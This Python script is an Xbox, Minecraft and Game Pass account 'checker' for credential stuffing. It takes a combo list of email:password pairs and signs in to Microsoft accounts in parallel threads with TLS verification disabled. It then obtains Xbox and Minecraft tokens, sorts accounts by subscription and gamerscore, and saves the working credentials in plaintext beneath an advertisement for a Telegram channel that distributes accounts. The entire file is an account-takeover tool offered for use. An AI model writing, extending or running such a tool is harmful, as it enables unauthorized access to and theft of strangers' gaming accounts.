# language: Python 3.10+, file: xbox.py
# Xbox / Minecraft / Game Pass / GScore checker — extracted from remo.py
# CLI: python xbox.py
# Import: from xbox import check_xbox

import re, os, sys, time, json, threading, random
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3
urllib3.disable_warnings()

ADS_HEADER = """Shiver Me Timbers 🏴‍☠️
🔥🔥🔥JOIN FOR DAILY PREMIUM DROPS 🔥🔥
🎮XBOX ACCOUNTS 🎮
📲STREAMING ACCOUNTS 📲
🎰GOOD QUALITY HOTMAILS 🎰
💥METHODS 💥
⚡AND MANY MORE PREMIUMS DROPS ⚡

Owner :- @Remo_god7

Group Chat :- @JoinPiratesCloudChat

🚨The content shared in this channel is for educational purpose only !!
https://t.me/JoinThePiratesCloud

────────────────────────────────────────────────────────
"""

MY_SIGNATURE = "@Remo_god7"

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)
MAX_RETRIES = 2
REQUEST_TIMEOUT = 10


# ══════════════════════════════════════════════════════════════════════════
# AUTH CHAIN
# ══════════════════════════════════════════════════════════════════════════
def _get_sftag(session, max_attempts=MAX_RETRIES):
    for _ in range(max_attempts):
        try:
            r = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = r.text
            m = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if m:
                sftag = m.group(1)
                m2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if m2:
                    return m2.group(1), sftag
        except Exception:
            pass
        time.sleep(0.5)
    return None, None


def _ms_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            r = session.post(url_post, data=data,
                             headers={'Content-Type': 'application/x-www-form-urlencoded'},
                             allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if '#' in r.url and r.url != SFTAG_URL:
                token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in r.text:
                try:
                    d = {
                        'ipt':   re.search(r'(?<="ipt" value=").+?(?=">)',   r.text).group(),
                        'pprid': re.search(r'(?<="pprid" value=").+?(?=">)', r.text).group(),
                        'uaid':  re.search(r'(?<="uaid" value=").+?(?=">)',  r.text).group(),
                    }
                    action_url = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text).group()
                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except Exception:
                    pass
            elif any(v in r.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt",
                                           "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in r.text.lower() for v in ["password is incorrect", "account doesn't exist",
                                                   "sign in to your microsoft account",
                                                   "tried to sign in too many times"]):
                return None, "bad"
        except Exception:
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"


def _xbox_token(session, ms_token):
    try:
        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                   "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
        r = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload,
                         headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                         timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
    except Exception:
        pass
    return None, None


def _xsts(session, xbox_token, rp):
    try:
        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                   "RelyingParty": rp, "TokenType": "JWT"}
        r = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload,
                         headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                         timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.json().get('Token')
    except Exception:
        pass
    return None


def _mc_token(session, uhs, xsts_token):
    try:
        r = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                         json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                         headers={'Content-Type': 'application/json'}, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.json().get('access_token')
    except Exception:
        pass
    return None


def _entitlements(session, mc_token):
    try:
        r = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                        headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
        if r.status_code != 200:
            return None, []
        t = r.text
        if 'product_game_pass_ultimate' in t:  return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
        if 'product_game_pass_premium' in t:   return 'Xbox Game Pass Premium', ["Xbox Game Pass Premium"]
        if 'product_game_pass_essential' in t: return 'Xbox Game Pass Essential', ["Xbox Game Pass Essential"]
        if 'product_game_pass_pc' in t:        return 'Xbox Game Pass', ["Xbox Game Pass"]
        if '"product_minecraft"' in t:         return 'Minecraft', ["Minecraft Java"]
        others = []
        if 'product_minecraft_bedrock' in t: others.append("Bedrock")
        if 'product_legends' in t:           others.append("Legends")
        if 'product_dungeons' in t:          others.append("Dungeons")
        if others: return 'Xbox: ' + ', '.join(others), others
    except Exception:
        pass
    return None, []


def _mc_profile(session, mc_token):
    try:
        r = session.get('https://api.minecraftservices.com/minecraft/profile',
                        headers={'Authorization': f'Bearer {mc_token}'}, timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return None


def _xbox_profile(session, uhs, xsts_token):
    try:
        r = session.get(
            "https://profile.xboxlive.com/users/me/profile/settings"
            "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep,Gamerscore",
            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_token}", "x-xbl-contract-version": "2",
                     "Accept": "application/json", "Accept-Language": "en-US"},
            timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            s = {x["id"]: x.get("value", "N/A") for x in data.get("profileUsers", [{}])[0].get("settings", [])}
            return {"gamertag": s.get("Gamertag", "N/A"), "tier": s.get("AccountTier", "N/A"),
                    "rep": s.get("XboxOneRep", "N/A"), "gamerscore": s.get("Gamerscore", "0")}
    except Exception:
        pass
    return {"gamertag": "N/A", "tier": "N/A", "rep": "N/A", "gamerscore": "0"}


def _xuid(session, uhs, xsts):
    try:
        r = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamerscore",
                        headers={"Authorization": f"XBL3.0 x={uhs};{xsts}", "x-xbl-contract-version": "2"},
                        timeout=REQUEST_TIMEOUT)
        if r.status_code == 200:
            return r.json().get('profileUsers', [{}])[0].get('id', '')
    except Exception:
        pass
    return ""


def _fetch_games(session, xsts, uhs, xuid=""):
    out = []
    headers = {"Authorization": f"XBL3.0 x={uhs};{xsts}", "Accept": "application/json",
               "Accept-Language": "en-US", "x-xbl-contract-version": "2",
               "x-xbl-client-name": "XboxApp", "x-xbl-client-type": "UWA",
               "x-xbl-client-version": "39.39.22001.0"}
    urls = []
    if xuid:
        urls.append(f"https://titlehub.xboxlive.com/users/xuid({xuid})/titles/titlehistory/decoration/achievement,image,scid")
    urls.append("https://titlehub.xboxlive.com/users/me/titles/titlehistory/decoration/achievement,image,scid")
    for u in urls:
        try:
            r = session.get(u, headers=headers, params={"maxItems": 100}, timeout=REQUEST_TIMEOUT)
            if r.status_code == 200:
                for t in r.json().get("titles", []):
                    name = t.get("name") or t.get("titleId", "Unknown")
                    ach = t.get("achievement", {})
                    cur = ach.get("currentGamerscore", 0)
                    tot = ach.get("totalGamerscore", 0)
                    if cur > 0 or tot > 0:
                        out.append(f"{name}: {cur}")
                if out:
                    out.sort(key=lambda x: int(x.split(': ')[1]), reverse=True)
                    return out
        except Exception:
            pass
    return out


# ══════════════════════════════════════════════════════════════════════════
# PUBLIC API
# ══════════════════════════════════════════════════════════════════════════
def check_xbox(email: str, password: str) -> dict:
    result = {"success": False, "type": "bad", "email": email, "password": password,
              "name": "N/A", "uuid": "N/A", "capes": "None", "gamertag": "N/A",
              "subscriptions": "None", "tier": "N/A", "rep": "N/A",
              "gamerscore": "0", "games": [], "error": None}
    session = None
    try:
        session = requests.Session()
        session.verify = False

        url_post, sftag = _get_sftag(session)
        if not url_post or not sftag:
            result["error"] = "Failed to get SFTag"; return result

        ms_token, auth_status = _ms_auth(session, email, password, url_post, sftag)
        if auth_status == "2fa":
            result["type"] = "2fa"; result["error"] = "2FA Required"; return result
        if auth_status == "bad":
            result["type"] = "bad"; result["error"] = "Invalid credentials"; return result
        if auth_status != "success" or not ms_token:
            result["type"] = "error"; result["error"] = "Authentication failed"; return result

        xbox_token, uhs = _xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            result["type"] = "bad"; result["error"] = "Xbox token failed"; return result

        xsts_mc  = _xsts(session, xbox_token, "rp://api.minecraftservices.com/")
        xsts_xbl = _xsts(session, xbox_token, "http://xboxlive.com")

        if xsts_xbl:
            prof = _xbox_profile(session, uhs, xsts_xbl)
            result["gamertag"]   = prof["gamertag"]
            result["tier"]       = prof["tier"]
            result["rep"]        = prof["rep"]
            result["gamerscore"] = prof["gamerscore"]
            xuid = _xuid(session, uhs, xsts_xbl)
            try:
                result["games"] = _fetch_games(session, xsts_xbl, uhs, xuid)
            except Exception:
                result["games"] = []
            try:
                if result["gamerscore"] in ("0", "N/A"):
                    total = sum(int(g.split(": ")[-1]) for g in result["games"] if ": " in g)
                    if total > 0:
                        result["gamerscore"] = str(total)
            except Exception:
                pass

        mc_token = _mc_token(session, uhs, xsts_mc) if xsts_mc else None
        account_type, subs = (None, [])
        if mc_token:
            account_type, subs = _entitlements(session, mc_token)

        try:
            gscore_val = int(result.get("gamerscore", "0") or 0)
        except Exception:
            gscore_val = 0

        if not account_type and gscore_val > 0:
            result["success"] = True; result["type"] = "gscore"
            result["subscriptions"] = "None"; return result
        if not account_type:
            result["success"] = True; result["type"] = "not_linked"
            result["subscriptions"] = "None"; return result

        if mc_token:
            prof = _mc_profile(session, mc_token)
            if prof:
                result["name"] = prof.get('name', 'Not Set')
                result["uuid"] = prof.get('id', 'N/A')
                capes = ", ".join(c["alias"] for c in prof.get("capes", []))
                result["capes"] = capes if capes else "None"

        result["subscriptions"] = ", ".join(subs) if subs else "None"
        result["type"] = account_type
        result["success"] = True
        return result

    except Exception as e:
        result["type"] = "error"; result["error"] = str(e)[:100]; return result
    finally:
        try:
            if session: session.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════
# CLI
# ══════════════════════════════════════════════════════════════════════════
class _C:
    R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[96m"
    BR="\033[1;92m"; BB="\033[1;94m"; BY="\033[1;93m"; E="\033[0m"; D="\033[2m"

def _classify(r: dict) -> str:
    t = r.get("type", "xbox")
    if t in ("Xbox Game Pass Ultimate", "Xbox Game Pass Premium",
             "Xbox Game Pass Essential", "Xbox Game Pass"): return "gamepass"
    if t == "Minecraft": return "minecraft"
    if t == "gscore":    return "gscore"
    if t == "not_linked":return "notlinked"
    if t == "2fa":       return "2fa"
    return "xbox"

def _save(category: str, hits: list[dict], folder="Results/Xbox"):
    if not hits: return None
    Path(folder).mkdir(parents=True, exist_ok=True)
    p = Path(folder) / f"{category}_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(p, "w", encoding="utf-8") as f:
        f.write(ADS_HEADER)
        f.write(f"# {category.upper()} — {len(hits)} hits\n")
        f.write(f"# Generated: {datetime.now()}\n")
        f.write(f"# Checked by: {MY_SIGNATURE}\n")
        f.write("=" * 60 + "\n\n")
        for i, h in enumerate(hits, 1):
            f.write(f"#{i}\n")
            f.write(f"Email         : {h['email']}\n")
            f.write(f"Password      : {h['password']}\n")
            f.write(f"Gamertag      : {h.get('gamertag', 'N/A')}\n")
            f.write(f"Tier          : {h.get('tier', 'N/A')}\n")
            f.write(f"Reputation    : {h.get('rep', 'N/A')}\n")
            f.write(f"Gamerscore    : {h.get('gamerscore', '0')}\n")
            f.write(f"MC Name       : {h.get('name', 'N/A')}\n")
            f.write(f"UUID          : {h.get('uuid', 'N/A')}\n")
            f.write(f"Capes         : {h.get('capes', 'None')}\n")
            f.write(f"Type          : {h.get('type', 'N/A')}\n")
            f.write(f"Subscriptions : {h.get('subscriptions', 'None')}\n")
            if h.get("games"):
                f.write("Games G-Score:\n")
                for g in h["games"]:
                    f.write(f"  - {g}\n")
            f.write(f"Captured By   : {MY_SIGNATURE}\n")
            f.write("-" * 60 + "\n\n")
    return p

def _main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{_C.B}╔════════════════════════════════════════════════════╗")
    print(f"║         XBOX / MC / GSCORE CHECKER                ║")
    print(f"╚════════════════════════════════════════════════════╝{_C.E}")
    combo_file = input(f"\n{_C.BY}Combo file:{_C.E} ").strip()
    if not os.path.exists(combo_file):
        print(f"{_C.R}✗ File not found{_C.E}"); return
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        combos = [l.strip() for l in f if l.strip() and ":" in l]
    if not combos:
        print(f"{_C.R}✗ No valid combos{_C.E}"); return
    try:
        threads = int(input(f"{_C.BY}Threads (1-10) [5]:{_C.E} ").strip() or "5")
    except Exception:
        threads = 5
    threads = max(1, min(10, threads))

    lock = threading.Lock()
    stats = {"total": len(combos), "done": 0, "hits": 0, "bad": 0, "2fa": 0, "err": 0}
    buckets = {"gamepass": [], "minecraft": [], "gscore": [], "notlinked": [], "xbox": [], "2fa": []}
    start = time.time()

    def _work(line):
        try:
            email, password = line.split(":", 1)
        except ValueError:
            return
        r = check_xbox(email.strip(), password.strip())
        with lock:
            stats["done"] += 1
            if r["success"]:
                stats["hits"] += 1
                cat = _classify(r)
                buckets.setdefault(cat, []).append(r)
                tag = r.get("type", "xbox")
                print(f"\n{_C.BR}✓ {email}{_C.E}  {_C.B}[{tag}]{_C.E}"
                      + (f"  GS:{r.get('gamerscore','0')}" if r.get("gamerscore") else ""))
            elif r.get("type") == "2fa":
                stats["2fa"] += 1
                buckets.setdefault("2fa", []).append(r)
                print(f"\n{_C.BY}🔐 {email}{_C.E}")
            elif r.get("type") == "bad":
                stats["bad"] += 1
            else:
                stats["err"] += 1
            elapsed = time.time() - start
            cpm = (stats["done"] / elapsed * 60) if elapsed > 0 else 0
            pct = stats["done"] / stats["total"] * 100
            filled = int(30 * pct / 100)
            bar = "█" * filled + "░" * (30 - filled)
            sys.stdout.write(
                f"\r{_C.B}[{bar}] {pct:5.1f}%{_C.E}  "
                f"{_C.BR}H:{stats['hits']}{_C.E} "
                f"{_C.BY}2FA:{stats['2fa']}{_C.E} "
                f"{_C.R}B:{stats['bad']}{_C.E}  "
                f"{stats['done']}/{stats['total']}  ({cpm:.0f} CPM)"
            )
            sys.stdout.flush()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        ex.map(_work, combos)

    print(f"\n\n{_C.B}{'='*60}{_C.E}")
    for cat, hits in buckets.items():
        if not hits: continue
        p = _save(cat, hits, f"Results/Xbox")
        if p:
            print(f"{_C.BR}{cat.upper():12}{_C.E}  {len(hits):4} hits  →  {p}")
    print(f"{_C.B}{'='*60}{_C.E}")
    print(f"  Hits: {stats['hits']}   2FA: {stats['2fa']}   Bad: {stats['bad']}   Errors: {stats['err']}")


if __name__ == "__main__":
    _main()